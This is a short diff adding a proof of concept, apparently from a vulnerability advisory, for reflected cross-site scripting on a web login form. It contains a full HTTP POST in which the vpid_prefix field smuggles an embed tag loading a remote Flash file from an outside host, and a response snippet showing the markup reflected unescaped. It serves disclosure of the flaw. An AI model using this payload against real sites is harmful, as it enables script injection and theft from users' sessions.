@@ -1,0 +1,29 @@
+--- CUT ---
+POST https://www.example.com:443/Login/Login HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.2)
+Gecko/20090729 Firefox/3.5.2
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer: https://www.example.com/Login/Login?LangCode=
+Cookie: CheckCookieSupport=1; ICSCookie=***purged***; user_locale=en_US
+Content-Type: application/x-www-form-urlencoded
+Content-length: 153
+
+loginType=Standard&amp;userName=&amp;vpid_prefix=&quot;&gt;&lt;embed/src=&quot;http://www.example2.com/p/s/w/ccs.swf&quot;
+allowScriptAccess=always&gt;&lt;a name=&quot;
+&amp;password=&amp;HeightData=1147&amp;Login=Sign+In
+
+--- CUT END ---
+
+Response Snippet:
+
+--- CUT ---
+&lt;input type=&quot;hidden&quot; id=&quot;vpid_prefix&quot; name=&quot;vpid_prefix&quot;
+value=&quot;&quot;&gt;&lt;embed/src=&quot;http://www.example2.com/p/s/w/ccs.swf&quot;
+allowScriptAccess=always&gt;&lt;a name=&quot;&quot;&gt;
+--- CUT END ---
